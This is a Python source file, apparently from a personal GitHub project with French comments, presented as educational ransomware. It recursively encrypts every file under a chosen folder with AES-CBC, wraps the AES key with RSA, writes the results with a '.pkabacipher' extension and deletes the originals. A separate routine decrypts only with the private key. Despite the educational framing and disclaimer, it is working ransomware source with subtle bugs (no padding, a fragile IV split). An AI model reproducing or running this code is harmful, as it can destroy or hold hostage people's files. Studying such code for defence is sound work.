"""
Coded By Alexis Pondo
Github: http://github.com/alexispondo/
Linkedin: https://www.linkedin.com/in/alexis-pondo/

Note: Ce programe est à but éducatif, en effet il a été écrit pour comprendre le fonctionnement des ransomware, comment le chiffrement sous-jacent fonctionne et comment il se propage sur une machine.
      Je ne suis en aucun cas reponsable de tous ce que vous ferrez avec.
"""

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


#############################################################################################################################
################################################## Symetric Cryptography ####################################################
#############################################################################################################################

# Fonction de generation de mot de passe pour le chiffrement symetrique
def gen_passw():
    key = os.urandom(32) #password
    return key #password

# Fonction de generation de vecteur d'initialisation
def gen_init_vertor():
    iv = os.urandom(16) # initialization vector
    return iv # initialization_vector

# Fonction de chiffrement symetrique il prend en paramètre le fichier à chiffrer, la clé publique pour chiffrer de façon assymetrique le password du chiffrement symetrique et le password en question
def sym_cipher_data(file, public_key, key_mdp):

    # vecteur d'initialisation
    init_v = gen_init_vertor()

    # On crée notre chiffreur :)
    cipher = Cipher(
        algorithms.AES(key_mdp),
        modes.CBC(init_v)
    )

    # On charge notre clé publique pour la rendre utilisable (deserialisation)
    pub_k = load_public_key(public_key)

    # On chiffre assymetriquement le password avec la clé publique
    ciphertext_pass = pub_k.encrypt(
        key_mdp,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    # On sauvegarde le resultat dans un fichier
    with open("password", "wb") as key:
        key.write(ciphertext_pass)
    #############################################################

    ## On chiffre assimetriquement le vecteur d'initialisation avec la clé publique
    #ciphertext_iv = pub_k.encrypt(
    #    key_iv[1],
    #    padding.OAEP(
    #        mgf=padding.MGF1(algorithm=hashes.SHA256()),
    #        algorithm=hashes.SHA256(),
    #        label=None
    #    )
    #)
    ## On sauvegarde le resultat dans un fichier
    #with open("init_vector", "wb") as iv:
    #    iv.write(ciphertext_iv)
    ###############################################################

    # On récupère l'information à chiffrer
    with open(file, "rb") as f:
        data = f.read()

    # On crypte la donné recupérer à l'aide de notre chiffreur
    data_crypte = cipher.encryptor().update(data) + cipher.encryptor().finalize()

    # on ajoute le vecteur d'initialisation au fichier
    data_and_init_vector = data_crypte + b"pkabacipher" + init_v

    # On sauvegarde l'information chiffré dans un fichier portant le même nom en y ajoutant l'extention ".pkabacipher"
    new_file = file + ".pkabacipher"
    with open(new_file, "wb") as nf:
        nf.write(data_and_init_vector)

    # On suprime l'ancien fichier
    os.remove(file)

# Fonction de dechiffrement symetrique il prend en paramètre le fichier chiffré, le password chiffré et la clé privée
def sym_decipher_data(file_cipher, key_cipher,  private_key):
    # On charge la clé privée
    priv_k = load_private_key(private_key)

    # On ouvre le fichier chiffrer symetriquement contenant en son sein le vecteur d'initialisation
    with open(file_cipher, "rb") as f:
        file_and_init = f.read()

    ## On déchiffre le mot de passe qui sera utilisé pour le dechiffrement symetrique
    with open(key_cipher, "rb") as k:  # On ouvre la clé (mdp symetrique) chiffré asymetriquement par la clé publique
        key = k.read()
    plaintext_key = priv_k.decrypt(
        key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    #######################################################################

    # On recupere chaque partie du fichier chiffrer
    #plaintext_iv = b"".join(file_and_init.split(b"pkabacipher")[-1]) # L evecteur d'initialisation pour ce fichier chiffrer
    plaintext_iv = file_and_init.split(b"pkabacipher")[1] # L evecteur d'initialisation pour ce fichier chiffrer
    #file = b"".join(file_and_init.split(b"pkabacipher")[:-1]) # Le contenu du fichier chiffrer
    file = file_and_init.split(b"pkabacipher")[0] # Le contenu du fichier chiffrer
    #print(plaintext_iv)
    #print(type(plaintext_iv))
    #print(file)
    #print(type(file))


    ## On déchiffre le vecteur d'initialisation qui sera utilisé pour le chiffrement symetrique
    #with open(iv_cipher, "rb") as iv:  # On ouvre le vecteur d'initailisation chiffré asymetriquement par la clé privée
    #    init_v = iv.read()
    #plaintext_iv = priv_k.decrypt(
    #    init_v,
    #    padding.OAEP(
    #        mgf=padding.MGF1(algorithm=hashes.SHA256()),
    #        algorithm=hashes.SHA256(),
    #        label=None
    #    )
    #)
    #############################################################################

    # On crèe notre dechiffreur
    cipher = Cipher(
        algorithms.AES(plaintext_key),
        modes.CBC(plaintext_iv)
    )

    # On decrypte les données récupérés à l'aide de notre dechiffreur (:
    plaintext_file = cipher.decryptor().update(file)+cipher.decryptor().finalize()

    # On sauvegarde l'information dechiffré dans un fichier portant le nom initial i.e en supprimant l'extention ".pkabacipher"
    new_file = ".".join(str(file_cipher).split(".")[:-1])
    with open(new_file, "wb") as nf:
        nf.write(plaintext_file)

    # On supprime le fichier chiffré
    os.remove(file_cipher)

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################







#############################################################################################################################
################################################# Asymetric cryptography ###################################################
#############################################################################################################################

# On genère une clé privé/publique de taille "size"
def generer_private_key(size = 2048):
    private_key = rsa.generate_private_key(
        public_exponent=65537,
        key_size=int(size),
    )
    return private_key

# Fonction permettant de charger une clé privée (la deserialiser)
def load_private_key(private_key_file):
    with open(private_key_file, "rb") as key_file:
        private_key = serialization.load_pem_private_key(
            key_file.read(),
            #password=b'mypassword',
            password=None,
        )
    return private_key

# Fonction permettant de serialiser une clé privée (l'enregistrer dans un fichier)
def serialyse_private_key(private_key, output):
    pem = private_key.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        #encryption_algorithm=serialization.BestAvailableEncryption(b'mypassword')
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(output, "wb") as private_key:
        private_key.write(pem)

# Fonction permettant d'extraire la clé plublique de la clé privée/publique
def get_public_key(private_key):
    public_key = private_key.public_key()
    return public_key

# Fonction permettant de serialiser une clé publique (l'enregistrer dans un fichier)
def serialize_public_key(public_key, output):
    pem = public_key.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open(output, "wb") as public_key:
        public_key.write(pem)

# Fonction permettant de charger une clé publique (la deserialiser)
def load_public_key(public_key_file):
    with open(public_key_file, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read()
        )
    return public_key

# Fonction de chiffrement asymetrique prenant en paramètre la clé publique et le fichier à chiffrer
def ch(public_key, file):
    with open(file, "rb") as f:
        message = f.read()
    ciphertext = public_key.encrypt(
        message,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    new_file = file + ".pkabacipher"
    with open(new_file, "wb") as nf:
        nf.write(ciphertext)
    os.remove(file)

# Fonction de dechiffrement asymetrique prenant en paramètre la clé privée et le fichier à dechiffrer
def dech(private_key, file):
    with open(file, "rb") as f:
        ciphertext = f.read()
    plaintext = private_key.decrypt(
        ciphertext,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    new_file = "".join(str(file).split(".")[:-1])
    with open(new_file, "wb") as nf:
        nf.write(plaintext)
    os.remove(file)

#############################################################################################################################
#############################################################################################################################
#############################################################################################################################

def crypter(public_key_file, mdp):
    print(os.getcwd())
    #public_key = load_public_key(public_key_file)
    print("\nVous avez choisi de chiffrer les fichier du disque")
    print("Veuillez entrer le dossier racine à partir duquel les fichiers serons chiffrer de manière recursive")
    print("ex: D:\\my_dir\\, /home/user/dir/ ...")
    dir = str(input("Entrer le chemin du dossier > "))
    if os.path.isdir(dir):
        for (current_dir, list_dir, files) in os.walk(dir):
            for f in files:
                path_file = current_dir + "/" + f
                #try:
                sym_cipher_data(path_file, public_key_file, mdp)
                    #ch(public_key, path_file)
                #except Exception as e:
                #    print(e)
    else:
        print("\nDésolé vous avez entrez un dossier inexistant :(")

def decrypter(private_key_file):
    print(os.getcwd())
    #private_key = load_private_key(private_key_file)
    print("\nVous avez choisi de dechiffrer les fichier du disque")
    print("Veuillez entrer le dossier racine à partir duquel les fichiers sont chiffrer pour debuter le decryptage des fichiers")
    print("ex: D:\\my_dir\\, /home/user/dir/ ...")
    dir = str(input("Entrer le chemin du dossier > "))
    if os.path.isdir(dir):
        for (current_dir, list_dir, files) in os.walk(dir):
            for f in files:
                path_file = current_dir + "/" + f
                #try:
                    #dech(private_key, path_file)
                sym_decipher_data(path_file, "password", private_key_file)
                #except Exception as e:
                #    print(e)
    else:
        print("\nDésolé vous avez entrez un dossier inexistant :(")

def main():
    choix = "1"
    while choix != "q":
        choix= input("1:crypter, 2:decrypter > ")
        if choix == "1":
            mdp = gen_passw() # On genere notre password
            crypter("public_key", mdp)
        elif choix == "2":
            decrypter("private_key")

main()


"""
def test_function():
    priv_k = generer_private_key(4096)
    print("priv = ", priv_k)
    pub_k = get_public_key(priv_k)
    print("pub = ", pub_k)
    serialize_public_key(pub_k, "public")
    serialyse_private_key(priv_k, "private")

    print("\n\nChargement...")
    priv_k1 = load_private_key("private")
    print("priv1 = ", priv_k1)

    pub_k1 = load_public_key("public")
    print("pub1 = ", pub_k1)

    serialize_public_key(pub_k1, "public1")
    serialyse_private_key(priv_k1, "private1")
"""